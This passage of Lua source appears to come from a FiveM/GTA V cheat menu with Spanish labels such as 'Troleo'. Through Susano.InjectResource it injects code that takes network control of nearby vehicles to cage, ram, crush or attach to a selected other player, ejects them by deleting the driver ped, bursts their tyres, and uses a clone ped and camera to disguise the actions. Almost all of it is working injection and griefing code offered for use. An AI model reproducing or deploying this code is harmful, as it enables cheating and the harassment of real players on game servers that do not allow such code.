            if not targetPlayerId then return end

            local targetPed = GetPlayerPed(targetPlayerId)
            if not DoesEntityExist(targetPed) then return end

            CreateThread(function()
                local playerPed = PlayerPedId()
                local myCoords = GetEntityCoords(playerPed)
                local myHeading = GetEntityHeading(playerPed)

                local vehicles = {}
                local searchRadius = 150.0
                local vehHandle, veh = FindFirstVehicle()
                local success

                repeat
                    local vehCoords = GetEntityCoords(veh)
                    local distance = #(myCoords - vehCoords)
                    local vehClass = GetVehicleClass(veh)
                    if distance <= searchRadius and veh ~= GetVehiclePedIsIn(playerPed, false) and vehClass ~= 8 and vehClass ~= 13 then
                        table.insert(vehicles, {handle = veh, distance = distance})
                    end
                    success, veh = FindNextVehicle(vehHandle)
                until not success

                EndFindVehicle(vehHandle)

                if #vehicles < 4 then return end

                table.sort(vehicles, function(a, b) return a.distance < b.distance end)
                local selectedVehicles = {vehicles[1].handle, vehicles[2].handle, vehicles[3].handle, vehicles[4].handle}

                local function takeControl(veh)
                    SetPedIntoVehicle(playerPed, veh, -1)
                    Wait(150)
                    SetEntityAsMissionEntity(veh, true, true)
                    if NetworkGetEntityIsNetworked(veh) then
                        NetworkRequestControlOfEntity(veh)
                    end
                    SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                    Wait(100)
                end

                for i = 1, 4 do
                    if DoesEntityExist(selectedVehicles[i]) then
                        takeControl(selectedVehicles[i])
                    end
                end

                local targetCoords = GetEntityCoords(targetPed)
                local positions = {
                    {x = targetCoords.x + 1.2, y = targetCoords.y, z = targetCoords.z, rotX = 90.0, rotY = 0.0, rotZ = 90.0},
                    {x = targetCoords.x - 1.2, y = targetCoords.y, z = targetCoords.z, rotX = 90.0, rotY = 0.0, rotZ = -90.0},
                    {x = targetCoords.x, y = targetCoords.y + 1.2, z = targetCoords.z, rotX = 90.0, rotY = 0.0, rotZ = 0.0},
                    {x = targetCoords.x, y = targetCoords.y - 1.2, z = targetCoords.z, rotX = 90.0, rotY = 0.0, rotZ = 180.0},
                }

                for i = 1, 4 do
                    if DoesEntityExist(selectedVehicles[i]) then
                        local pos = positions[i]
                        SetEntityCoordsNoOffset(selectedVehicles[i], pos.x, pos.y, pos.z, false, false, false)
                        SetEntityRotation(selectedVehicles[i], pos.rotX, pos.rotY, pos.rotZ, 2, true)
                        FreezeEntityPosition(selectedVehicles[i], true)
                    end
                end
            end)
        ]], targetServerId))
    end
end

                    function Menu.ActionRamPlayer()
                        if not Menu.SelectedPlayer then return end

                        local targetServerId = Menu.SelectedPlayer

                        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                            Susano.InjectResource("any", string.format([[
                                local targetServerId = %d

                                local function ramPlayer(ped)
                                    if not ped or not DoesEntityExist(ped) then return end

                                    local playerPed = PlayerPedId()
                                    local myCoords = GetEntityCoords(playerPed)

                                    local closestVeh = GetClosestVehicle(myCoords.x, myCoords.y, myCoords.z, 100.0, 0, 70)
                                    if not closestVeh or closestVeh == 0 then return end

                                    local savedCoords = GetEntityCoords(playerPed)
                                    local savedHeading = GetEntityHeading(playerPed)

                                    SetEntityAsMissionEntity(closestVeh, true, true)
                                    local timeout = 1000
                                    NetworkRequestControlOfEntity(closestVeh)
                                    while not NetworkHasControlOfEntity(closestVeh) and timeout > 0 do
                                        Wait(10)
                                        timeout = timeout - 10
                                        NetworkRequestControlOfEntity(closestVeh)
                                    end

                                    SetPedIntoVehicle(playerPed, closestVeh, -1)
                                    Wait(100)

                                    SetEntityCoordsNoOffset(playerPed, savedCoords.x, savedCoords.y, savedCoords.z, false, false, false)
                                    SetEntityHeading(playerPed, savedHeading)
                                    Wait(50)

                                    local targetCoords = GetEntityCoords(ped)
                                    local spawnPos = GetOffsetFromEntityInWorldCoords(ped, 0.0, -10.0, 0.0)
                                    local heading = GetEntityHeading(ped)

                                    SetEntityCoordsNoOffset(closestVeh, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false)
                                    SetEntityHeading(closestVeh, heading)

                                    SetVehicleForwardSpeed(closestVeh, 100.0)
                                    SetEntityVisible(closestVeh, true, false)
                                    SetVehicleDoorsLocked(closestVeh, 4)
                                    SetVehicleEngineOn(closestVeh, true, true, false)

                                    Citizen.SetTimeout(15000, function()
                                        if DoesEntityExist(closestVeh) then
                                            DeleteVehicle(closestVeh)
                                        end
                                    end)
                                end

                                local targetPlayerId = nil
                                for _, player in ipairs(GetActivePlayers()) do
                                    if GetPlayerServerId(player) == targetServerId then
                                        targetPlayerId = player
                                        break
                                    end
                                end

                                if not targetPlayerId then return end

                                local ped = GetPlayerPed(targetPlayerId)
                                if ped and ped ~= 0 then
                                    ramPlayer(ped)
                                end
                            ]], targetServerId))
                        end
                    end

function Menu.ActionRainVehicle()
    if not Menu.SelectedPlayer then return end

    local targetServerId = Menu.SelectedPlayer

    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            local targetServerId = %d

            local targetPlayerId = nil
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == targetServerId then
                    targetPlayerId = player
                    break
                end
            end

            if not targetPlayerId then return end

            local targetPed = GetPlayerPed(targetPlayerId)
            if not DoesEntityExist(targetPed) then return end

            CreateThread(function()
                local playerPed = PlayerPedId()
                local myCoords = GetEntityCoords(playerPed)

                local nearbyVehicles = {}
                local vehHandle, veh = FindFirstVehicle()
                local success

                repeat
                    if DoesEntityExist(veh) then
                        local vehCoords = GetEntityCoords(veh)
                        local distance = #(myCoords - vehCoords)
                        if distance <= 200.0 and distance > 5.0 and veh ~= GetVehiclePedIsIn(playerPed, false) then
                            table.insert(nearbyVehicles, veh)
                        end
                    end
                    success, veh = FindNextVehicle(vehHandle)
                until not success

                EndFindVehicle(vehHandle)

                if #nearbyVehicles == 0 then return end

                for i, veh in ipairs(nearbyVehicles) do
                    if DoesEntityExist(veh) then
                        SetPedIntoVehicle(playerPed, veh, -1)
                        Wait(50)
                        SetEntityAsMissionEntity(veh, true, true)
                        if NetworkGetEntityIsNetworked(veh) then
                            NetworkRequestControlOfEntity(veh)
                        end
                        local targetCoords = GetEntityCoords(targetPed)
                        SetEntityCoordsNoOffset(veh, targetCoords.x, targetCoords.y, targetCoords.z + 50.0, false, false, false)
                        SetEntityHasGravity(veh, true)
                        Wait(10)
                    end
                end
            end)
        ]], targetServerId))
    end
end

function Menu.ActionDropVehicle()
    if not Menu.SelectedPlayer then return end

    local targetServerId = Menu.SelectedPlayer

    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            local targetServerId = %d

            local targetPlayerId = nil
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == targetServerId then
                    targetPlayerId = player
                    break
                end
            end

            if not targetPlayerId then return end

            local targetPed = GetPlayerPed(targetPlayerId)
            if not DoesEntityExist(targetPed) then return end

            CreateThread(function()
                local playerPed = PlayerPedId()
                local myCoords = GetEntityCoords(playerPed)
                local myHeading = GetEntityHeading(playerPed)

                local closestVeh = GetClosestVehicle(myCoords.x, myCoords.y, myCoords.z, 100.0, 0, 70)
                if not closestVeh or closestVeh == 0 then return end

                SetPedIntoVehicle(playerPed, closestVeh, -1)
                Wait(150)

                SetEntityAsMissionEntity(closestVeh, true, true)
                if NetworkGetEntityIsNetworked(closestVeh) then
                    NetworkRequestControlOfEntity(closestVeh)
                end

                SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                Wait(100)

                local targetCoords = GetEntityCoords(targetPed)
                SetEntityCoordsNoOffset(closestVeh, targetCoords.x, targetCoords.y, targetCoords.z + 15.0, false, false, false)
                SetEntityRotation(closestVeh, 0.0, -90.0, 0.0, 2, true)
                SetEntityVelocity(closestVeh, 0.0, 0.0, -100.0)
            end)
        ]], targetServerId))
    end
end

                    Menu.CrushMode = "Lluvia"

                    function Menu.ActionCrush()
                        local crushMode = Menu.CrushMode or "Lluvia"
                        if crushMode == "Lluvia" then
                            Menu.ActionRainVehicle()
                        elseif crushMode == "Caida" then
                            Menu.ActionDropVehicle()
                        elseif crushMode == "Embestir" then
                            Menu.ActionRamPlayer()
                        end
                    end

                    function Menu.ActionBugAttach()
                        if not Menu.SelectedPlayer then return end

                        local targetServerId = Menu.SelectedPlayer

                        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                            Susano.InjectResource("any", string.format([[
                                local targetServerId = %d

                                local function reqCtrl(entity)
                                    if not entity or entity == 0 then return false end
                                    if not NetworkGetEntityIsNetworked(entity) then
                                        NetworkRegisterEntityAsNetworked(entity)
                                    end
                                    if NetworkGetEntityIsNetworked(entity) then
                                        NetworkRequestControlOfEntity(entity)
                                        local attempts = 0
                                        while not NetworkHasControlOfEntity(entity) and attempts < 50 do
                                            Wait(0)
                                            attempts = attempts + 1
                                            NetworkRequestControlOfEntity(entity)
                                        end
                                        return NetworkHasControlOfEntity(entity)
                                    end
                                    return false
                                end

                                local targetPlayerId = nil
                                for _, player in ipairs(GetActivePlayers()) do
                                    if GetPlayerServerId(player) == targetServerId then
                                        targetPlayerId = player
                                        break
                                    end
                                end
                                if not targetPlayerId then return end

                                local targetPed = GetPlayerPed(targetPlayerId)
                                if not DoesEntityExist(targetPed) then return end

                                local playerPed = PlayerPedId()
                                local myCoords = GetEntityCoords(playerPed)
                                local closestVeh = GetClosestVehicle(myCoords.x, myCoords.y, myCoords.z, 120.0, 0, 70)
                                if not closestVeh or closestVeh == 0 then return end

                                SetEntityAsMissionEntity(closestVeh, true, true)
                                reqCtrl(closestVeh)

                                SetPedIntoVehicle(playerPed, closestVeh, -1)
                                Wait(120)

                                SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)

                                local targetVeh = GetVehiclePedIsIn(targetPed, false)
                                if targetVeh ~= 0 and DoesEntityExist(targetVeh) then
                                    AttachEntityToEntityPhysically(
                                        closestVeh, targetVeh,
                                        0, 0.0, 0.0, 0.0,
                                        0.0, 0.0, 0.0,
                                        0.0, 0.0, 0.0,
                                        1, false, false, 1, 2
                                    )
                                else
                                    AttachEntityToEntityPhysically(
                                        closestVeh, targetPed,
                                        0, 0.0, 0.0, 0.0,
                                        0.0, 0.0, 0.0,
                                        0.0, 0.0, 0.0,
                                        1, false, false, 1, 2
                                    )
                                end
                            ]], targetServerId))
                    end
                end

if not attachedPlayers then attachedPlayers = {} end

CreateThread(function()
    while true do
        Wait(0)
        if attachedPlayers and next(attachedPlayers) then
            local me = PlayerPedId()
            if DoesEntityExist(me) then
                local coords = GetEntityCoords(me)
                local f = GetEntityForwardVector(me)
                for playerId, ped in pairs(attachedPlayers) do
                    if DoesEntityExist(ped) then
                        local success = pcall(function()
                            SetEntityCoordsNoOffset(ped, coords.x + f.x, coords.y + f.y, coords.z + f.z, true, true, true)
                            SetEntityHeading(ped, GetEntityHeading(me))
                        end)
                        if not success then
                            attachedPlayers[playerId] = nil
                        end
                    else
                        attachedPlayers[playerId] = nil
                    end
                end
            end
        end
    end
end)

                    function Menu.ActionTPToMe()
                        if not Menu.SelectedPlayer then return end

                        local targetServerId = Menu.SelectedPlayer

                        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                            Susano.InjectResource("any", string.format([[
                                local targetServerId = %d

                                local function reqCtrl(entity)
                                    if not entity or entity == 0 then return false end
                                    if not NetworkGetEntityIsNetworked(entity) then
                                        NetworkRegisterEntityAsNetworked(entity)
                                    end
                                    if NetworkGetEntityIsNetworked(entity) then
                                        NetworkRequestControlOfEntity(entity)
                                        local attempts = 0
                                        while not NetworkHasControlOfEntity(entity) and attempts < 50 do
                                            Wait(0)
                                            attempts = attempts + 1
                                            NetworkRequestControlOfEntity(entity)
                                        end
                                        return NetworkHasControlOfEntity(entity)
                                    end
                                    return false
                                end

                                local targetPlayerId = nil
                                for _, player in ipairs(GetActivePlayers()) do
                                    if GetPlayerServerId(player) == targetServerId then
                                        targetPlayerId = player
                                        break
                                    end
                                end
                                if not targetPlayerId then return end

                                local targetPed = GetPlayerPed(targetPlayerId)
                                if not DoesEntityExist(targetPed) then return end

                                local playerPed = PlayerPedId()
                                local myCoords = GetEntityCoords(playerPed)
                                local closestVeh = GetClosestVehicle(myCoords.x, myCoords.y, myCoords.z, 120.0, 0, 70)
                                if not closestVeh or closestVeh == 0 then return end

                                SetEntityAsMissionEntity(closestVeh, true, true)
                                reqCtrl(closestVeh)

                                SetPedIntoVehicle(playerPed, closestVeh, -1)
                                Wait(120)

                                SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)

                                local targetVeh = GetVehiclePedIsIn(targetPed, false)
                                if targetVeh ~= 0 and DoesEntityExist(targetVeh) then
                                    AttachEntityToEntityPhysically(
                                        closestVeh, targetVeh,
                                        0, 0.0, 0.0, 0.0,
                                        0.0, 0.0, 0.0,
                                        0.0, 0.0, 0.0,
                                        1, false, false, 1, 2
                                    )
                                    Wait(200)
                                    DetachEntity(closestVeh, true, true)
                                    SetEntityCoordsNoOffset(closestVeh, myCoords.x, myCoords.y, myCoords.z + 1.0, false, false, false)
                                    Wait(100)
                                    AttachEntityToEntityPhysically(
                                        closestVeh, targetVeh,
                                        0, 0.0, 0.0, 0.0,
                                        0.0, 0.0, 0.0,
                                        0.0, 0.0, 0.0,
                                        1, false, false, 1, 2
                                    )
                                else
                                    AttachEntityToEntityPhysically(
                                        closestVeh, targetPed,
                                        0, 0.0, 0.0, 0.0,
                                        0.0, 0.0, 0.0,
                                        0.0, 0.0, 0.0,
                                        1, false, false, 1, 2
                                    )
                                    Wait(200)
                                    DetachEntity(closestVeh, true, true)
                                    SetEntityCoordsNoOffset(closestVeh, myCoords.x, myCoords.y, myCoords.z + 1.0, false, false, false)
                                    Wait(100)
                                    AttachEntityToEntityPhysically(
                                        closestVeh, targetPed,
                                        0, 0.0, 0.0, 0.0,
                                        0.0, 0.0, 0.0,
                                        0.0, 0.0, 0.0,
                                        1, false, false, 1, 2
                                    )
                                end
                            ]], targetServerId))
                        end
                    end

Actions.attachPlayerItem = FindItem("En linea", "Troleo", "Enganchar jugador")
if Actions.attachPlayerItem then
    Actions.attachPlayerItem.onClick = function(value)
        Menu.attachPlayerEnabled = value
        if not Menu.SelectedPlayer then
            Menu.attachPlayerEnabled = false
            return
        end

        local targetServerId = Menu.SelectedPlayer

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", string.format([[
                local targetServerId = %d
                local enabled = %s

                local targetPlayerId = nil
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetServerId then
                        targetPlayerId = player
                        break
                    end
                end

                if not targetPlayerId then return end
                local targetPed = GetPlayerPed(targetPlayerId)
                if not DoesEntityExist(targetPed) then return end

                local playerPed = PlayerPedId()

                if enabled then
                    CreateThread(function()
                        rawset(_G, 'attach_loop_' .. targetServerId, true)

                        while rawget(_G, 'attach_loop_' .. targetServerId) do
                            Wait(0)

                            if not DoesEntityExist(targetPed) then break end

                            local myCoords = GetEntityCoords(playerPed)
                            local myForward = GetEntityForwardVector(playerPed)
                            local myHeading = GetEntityHeading(playerPed)

                            SetEntityCoordsNoOffset(targetPed, myCoords.x + myForward.x, myCoords.y + myForward.y, myCoords.z + myForward.z, true, true, true)
                            SetEntityHeading(targetPed, myHeading)
                        end
                    end)
                else
                    rawset(_G, 'attach_loop_' .. targetServerId, false)
                end
            ]], targetServerId, tostring(value)))
        end
                        end
                    end

Menu.BugVehicleMode = "V1"
Menu.KickVehicleMode = "V1"

function Menu.ActionBugVehicle()
    if not Menu.SelectedPlayer then return end

    local targetServerId = Menu.SelectedPlayer
    local bugVehicleMode = Menu.BugVehicleMode or "V1"

    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            local targetServerId = %d
            local bugVehicleMode = "%s"

            local targetPlayerId = nil
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == targetServerId then
                    targetPlayerId = player
                    break
                end
            end

            if not targetPlayerId then return end

            local targetPed = GetPlayerPed(targetPlayerId)
            if not DoesEntityExist(targetPed) or not IsPedInAnyVehicle(targetPed, false) then
                return
            end

            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if not DoesEntityExist(targetVehicle) then return end

            if bugVehicleMode == "V2" then
            CreateThread(function()
                    local function reqCtrl(entity)
                        if not entity or entity == 0 then return false end
                        if not NetworkGetEntityIsNetworked(entity) then
                            NetworkRegisterEntityAsNetworked(entity)
                        end
                        if NetworkGetEntityIsNetworked(entity) then
                            NetworkRequestControlOfEntity(entity)
                            local attempts = 0
                            while not NetworkHasControlOfEntity(entity) and attempts < 30 do
                                Wait(10)
                                attempts = attempts + 1
                                NetworkRequestControlOfEntity(entity)
                            end
                            return NetworkHasControlOfEntity(entity)
                        end
                        return false
                    end

                    local playerPed = PlayerPedId()
                    local myCoords = GetEntityCoords(playerPed)
                    local closestVeh = GetClosestVehicle(myCoords.x, myCoords.y, myCoords.z, 120.0, 0, 70)
                    if not closestVeh or closestVeh == 0 then return end

                    SetEntityAsMissionEntity(closestVeh, true, true)
                    if not reqCtrl(closestVeh) then return end

                    SetPedIntoVehicle(playerPed, closestVeh, -1)
                    Wait(120)

                    SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                    Wait(50)

                    AttachEntityToEntityPhysically(
                        closestVeh, targetVehicle,
                        0, 0.0, 0.0, 0.0,
                        0.0, 0.0, 0.0,
                        0.0, 0.0, 0.0,
                        500.0, false, false, 1, 2
                    )

                    Wait(100)

                    AttachEntityToEntityPhysically(
                        closestVeh, targetVehicle,
                        0, 0.0, 0.0, 0.0,
                        0.0, 0.0, 0.0,
                        0.0, 0.0, 0.0,
                        500.0, false, false, 1, 2
                    )
                end)
            else
                CreateThread(function()
                local playerPed = PlayerPedId()
                local myCoords = GetEntityCoords(playerPed)

                local closestVeh = GetClosestVehicle(myCoords.x, myCoords.y, myCoords.z, 100.0, 0, 70)
                if not closestVeh or closestVeh == 0 then return end

                SetPedIntoVehicle(playerPed, closestVeh, -1)
                Wait(150)

                SetEntityAsMissionEntity(closestVeh, true, true)
                if NetworkGetEntityIsNetworked(closestVeh) then
                    NetworkRequestControlOfEntity(closestVeh)
                end

                SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                Wait(100)

                for i = 1, 30 do
                    DetachEntity(closestVeh, true, true)
                    Wait(5)
                    AttachEntityToEntityPhysically(closestVeh, targetVehicle, 0, 0, 0, 2000.0, 1460.0, 1000.0, 10.0, 88.0, 600.0, true, true, true, false, 0)
                    Wait(5)
                end
            end)
            end
        ]], targetServerId, bugVehicleMode))
    end
end

function Menu.ActionKickVehicle()
    if not Menu.SelectedPlayer then return end

    local targetServerId = Menu.SelectedPlayer
    local kickMode = Menu.KickVehicleMode or "V1"

    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            local targetServerId = %d
            local kickMode = "%s"

            local targetPlayerId = nil
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == targetServerId then
                    targetPlayerId = player
                    break
                end
            end

            if not targetPlayerId then return end

            local targetPed = GetPlayerPed(targetPlayerId)
            if not DoesEntityExist(targetPed) or not IsPedInAnyVehicle(targetPed, false) then
                return
            end

            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if not DoesEntityExist(targetVehicle) then return end

            CreateThread(function()
                local player = PlayerPedId()

                if DoesEntityExist(targetVehicle) then
                    local driver = GetPedInVehicleSeat(targetVehicle, -1)
                    if driver ~= 0 and DoesEntityExist(driver) then
                        SetPedIntoVehicle(player, targetVehicle, 0)
                        Wait(10)
                        NetworkRequestControlOfEntity(targetVehicle)
                        DeletePed(driver)
                        SetPedIntoVehicle(player, targetVehicle, -1)
                        Wait(25)
                        TaskLeaveVehicle(player, targetVehicle, 16)
                        Wait(450)
                    end
                end
                end)
        ]], targetServerId, kickMode))
    end
end

function Menu.ActionRemoveAllTires()
    if not Menu.SelectedPlayer then return end

    local targetServerId = Menu.SelectedPlayer

    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            local targetServerId = %d

            local targetPlayerId = nil
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == targetServerId then
                    targetPlayerId = player
                    break
                end
            end

            if not targetPlayerId then return end

            local targetPed = GetPlayerPed(targetPlayerId)
            if not DoesEntityExist(targetPed) or not IsPedInAnyVehicle(targetPed, false) then
                return
            end

            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if not DoesEntityExist(targetVehicle) then return end

            CreateThread(function()
                local player = PlayerPedId()
                local playerCoords = GetEntityCoords(player)
                local playerHeading = GetEntityHeading(player)

                if DoesEntityExist(targetVehicle) then
                    local driver = GetPedInVehicleSeat(targetVehicle, -1)
                    if driver ~= 0 and DoesEntityExist(driver) then
                        SetPedIntoVehicle(player, targetVehicle, 0)
                        Wait(10)
                        NetworkRequestControlOfEntity(targetVehicle)
                        DeletePed(driver)
                        SetPedIntoVehicle(player, targetVehicle, -1)
                        Wait(25)
                        TaskLeaveVehicle(player, targetVehicle, 16)
                        Wait(450)
                    end

                    NetworkRequestControlOfEntity(targetVehicle)
                    local timeout = 0
                    while not NetworkHasControlOfEntity(targetVehicle) and timeout < 50 do
                        NetworkRequestControlOfEntity(targetVehicle)
                        Wait(10)
                        timeout = timeout + 1
                    end

                    if NetworkHasControlOfEntity(targetVehicle) then
                        for wheel = 0, 3 do
                            SetVehicleTyreBurst(targetVehicle, wheel, true, 1000.0)
                            SetVehicleWheelHealth(targetVehicle, wheel, -1000.0)
                            SetVehicleTyreBurst(targetVehicle, wheel, true, 1000.0)
                        end
                        SetVehicleWheelType(targetVehicle, 7)
                        Wait(50)
                        for wheel = 0, 3 do
                            SetVehicleTyreBurst(targetVehicle, wheel, true, 1000.0)
                            SetVehicleWheelHealth(targetVehicle, wheel, -1000.0)
                        end
                    end
                end

                SetEntityCoordsNoOffset(player, playerCoords.x, playerCoords.y, playerCoords.z, false, false, false)
                SetEntityHeading(player, playerHeading)
                Wait(50)
                SetEntityCoordsNoOffset(player, playerCoords.x, playerCoords.y, playerCoords.z, false, false, false)
                SetEntityHeading(player, playerHeading)
            end)
        ]], targetServerId))
    end
end

function Menu.ActionGiveVehicle()
    if not Menu.SelectedPlayer then return end

    local targetServerId = Menu.SelectedPlayer

    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
CreateThread(function()
    local targetServerId = %d

    local targetPlayerId = nil
    for _, player in ipairs(GetActivePlayers()) do
        if GetPlayerServerId(player) == targetServerId then
            targetPlayerId = player
            break
        end
    end

    if not targetPlayerId then
        return
    end

    local targetPed = GetPlayerPed(targetPlayerId)
    if not DoesEntityExist(targetPed) then
        return
    end

    local playerPed = PlayerPedId()
    local myCoords = GetEntityCoords(playerPed)
    local myHeading = GetEntityHeading(playerPed)

    local giveCam = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
    local camCoords = GetGameplayCamCoord()
    local camRot = GetGameplayCamRot(2)
    SetCamCoord(giveCam, camCoords.x, camCoords.y, camCoords.z)
    SetCamRot(giveCam, camRot.x, camRot.y, camRot.z, 2)
    SetCamFov(giveCam, GetGameplayCamFov())
    SetCamActive(giveCam, true)
    RenderScriptCams(true, false, 0, true, true)

    local playerModel = GetEntityModel(playerPed)
    RequestModel(playerModel)
    local timeout = 0
    while not HasModelLoaded(playerModel) and timeout < 50 do
        Wait(50)
        timeout = timeout + 1
    end

    local groundZ = myCoords.z
    local rayHandle = StartShapeTestRay(myCoords.x, myCoords.y, myCoords.z + 2.0, myCoords.x, myCoords.y, myCoords.z - 100.0, 1, 0, 0)
    local _, hit, hitCoords, _, _ = GetShapeTestResult(rayHandle)
    if hit then
        groundZ = hitCoords.z
    end

    local clonePed = CreatePed(4, playerModel, myCoords.x, myCoords.y, groundZ, myHeading, false, false)
    SetEntityCollision(clonePed, false, false)
    FreezeEntityPosition(clonePed, true)
    SetEntityInvincible(clonePed, true)
    SetBlockingOfNonTemporaryEvents(clonePed, true)
    SetPedCanRagdoll(clonePed, false)
    ClonePedToTarget(playerPed, clonePed)

    SetEntityVisible(playerPed, false, false)
    SetEntityLocallyInvisible(playerPed)

    local closestVeh = GetClosestVehicle(myCoords.x, myCoords.y, myCoords.z, 100.0, 0, 70)

    if not closestVeh or closestVeh == 0 then
        SetEntityVisible(playerPed, true, false)
        SetCamActive(giveCam, false)
        if not rawget(_G, 'isSpectating') then
            RenderScriptCams(false, false, 0, true, true)
        end
        DestroyCam(giveCam, true)
        if DoesEntityExist(clonePed) then
            DeleteEntity(clonePed)
        end
        SetModelAsNoLongerNeeded(playerModel)
        return
    end

    SetPedIntoVehicle(playerPed, closestVeh, -1)
    Wait(150)
    SetEntityAsMissionEntity(closestVeh, true, true)
    if NetworkGetEntityIsNetworked(closestVeh) then
        NetworkRequestControlOfEntity(closestVeh)
        local timeout = 0
        while not NetworkHasControlOfEntity(closestVeh) and timeout < 50 do
            NetworkRequestControlOfEntity(closestVeh)
            Wait(10)
            timeout = timeout + 1
        end
    end

    SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
    SetEntityHeading(playerPed, myHeading)
    Wait(100)

    if not DoesEntityExist(targetPed) or not DoesEntityExist(closestVeh) then
        SetEntityVisible(playerPed, true, false)
        SetCamActive(giveCam, false)
        if not rawget(_G, 'isSpectating') then
            RenderScriptCams(false, false, 0, true, true)
        end
        DestroyCam(giveCam, true)
        if DoesEntityExist(clonePed) then
            DeleteEntity(clonePed)
        end
        SetModelAsNoLongerNeeded(playerModel)
        return
    end

    local targetCoords = GetEntityCoords(targetPed)
    local targetHeading = GetEntityHeading(targetPed)
    local offsetCoords = GetOffsetFromEntityInWorldCoords(targetPed, 3.0, 0.0, 0.0)

    SetEntityCoordsNoOffset(closestVeh, offsetCoords.x, offsetCoords.y, offsetCoords.z, false, false, false)
    SetEntityHeading(closestVeh, targetHeading)
    SetVehicleOnGroundProperly(closestVeh)

    Wait(500)
    SetEntityVisible(playerPed, true, false)
    SetCamActive(giveCam, false)
    if not rawget(_G, 'isSpectating') then
        RenderScriptCams(false, false, 0, true, true)
    end
    DestroyCam(giveCam, true)
    if DoesEntityExist(clonePed) then
        DeleteEntity(clonePed)
    end
    SetModelAsNoLongerNeeded(playerModel)
end)
        ]], targetServerId)

        Susano.InjectResource("any", WrapWithVehicleHooks(code))
    end
end

function Menu.ActionGiveRamp()
    if not Menu.SelectedPlayer then return end

    local targetServerId = Menu.SelectedPlayer

    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
local targetServerId = %d
local targetPlayerId = nil
for _, player in ipairs(GetActivePlayers()) do
    if GetPlayerServerId(player) == targetServerId then
        targetPlayerId = player
        break
    end
end

if not targetPlayerId then
    return
end

local targetPed = GetPlayerPed(targetPlayerId)
if not DoesEntityExist(targetPed) then
    return
end

if not IsPedInAnyVehicle(targetPed, false) then
    return
end

local targetVehicle = GetVehiclePedIsIn(targetPed, false)
if not DoesEntityExist(targetVehicle) then
    return
end

CreateThread(function()
    local playerPed = PlayerPedId()
    local myCoords = GetEntityCoords(playerPed)
    local myHeading = GetEntityHeading(playerPed)

    local rampCam = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
    local camCoords = GetGameplayCamCoord()
    local camRot = GetGameplayCamRot(2)
    SetCamCoord(rampCam, camCoords.x, camCoords.y, camCoords.z)
    SetCamRot(rampCam, camRot.x, camRot.y, camRot.z, 2)
    SetCamFov(rampCam, GetGameplayCamFov())
    SetCamActive(rampCam, true)
    RenderScriptCams(true, false, 0, true, true)

    local playerModel = GetEntityModel(playerPed)
    RequestModel(playerModel)
    local timeout = 0
    while not HasModelLoaded(playerModel) and timeout < 50 do
        Wait(50)
        timeout = timeout + 1
    end

    local groundZ = myCoords.z
    local rayHandle = StartShapeTestRay(myCoords.x, myCoords.y, myCoords.z + 2.0, myCoords.x, myCoords.y, myCoords.z - 100.0, 1, 0, 0)
    local _, hit, hitCoords, _, _ = GetShapeTestResult(rayHandle)
    if hit then
        groundZ = hitCoords.z
    end

    local clonePed = CreatePed(4, playerModel, myCoords.x, myCoords.y, groundZ, myHeading, false, false)
    SetEntityCollision(clonePed, false, false)
    FreezeEntityPosition(clonePed, true)
    SetEntityInvincible(clonePed, true)
    SetBlockingOfNonTemporaryEvents(clonePed, true)
    SetPedCanRagdoll(clonePed, false)
    ClonePedToTarget(playerPed, clonePed)

    SetEntityVisible(playerPed, false, false)

    local targetCoords = GetEntityCoords(targetVehicle)
    local vehicles = {}
    local searchRadius = 100.0
    local vehHandle, veh = FindFirstVehicle()
    local success

    repeat
        local vehCoords = GetEntityCoords(veh)
        local distance = #(targetCoords - vehCoords)
        local vehClass = GetVehicleClass(veh)
        if distance <= searchRadius and veh ~= targetVehicle and vehClass ~= 8 and vehClass ~= 13 then
            table.insert(vehicles, {handle = veh, distance = distance})
        end
        success, veh = FindNextVehicle(vehHandle)
    until not success
    EndFindVehicle(vehHandle)

    if #vehicles < 3 then
        SetEntityVisible(playerPed, true, false)
        SetCamActive(rampCam, false)
        RenderScriptCams(false, false, 0, true, true)
        DestroyCam(rampCam, true)
        if DoesEntityExist(clonePed) then
            DeleteEntity(clonePed)
        end
        SetModelAsNoLongerNeeded(playerModel)
        return
    end

    table.sort(vehicles, function(a, b) return a.distance < b.distance end)
    local selectedVehicles = {vehicles[1].handle, vehicles[2].handle, vehicles[3].handle}

    local function takeControl(veh)
        SetPedIntoVehicle(playerPed, veh, -1)
        Wait(150)
